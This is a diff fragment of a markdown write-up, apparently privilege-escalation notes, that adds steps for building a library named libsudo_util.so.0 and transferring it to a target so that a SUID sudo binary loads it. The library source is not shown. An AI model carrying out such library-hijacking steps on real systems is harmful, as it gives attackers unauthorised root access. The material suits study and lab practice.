@@ -211,7 +211,15 @@ $ ldd /snap/core20/2264/usr/bin/sudo
 
 
 
+```
+$ gcc -fPIC -c libsudo_util.c -o libsudo_util.o
+$ gcc -shared -o libsudo_util.so.0 libsudo_util.o
+$ file libsudo_util.o
 
+
+... python3 server transfer to target
+$ mv libsudo_util.o libsudo_util.so.0
+```
 
 ### /usr/bin/mount with SUID
 
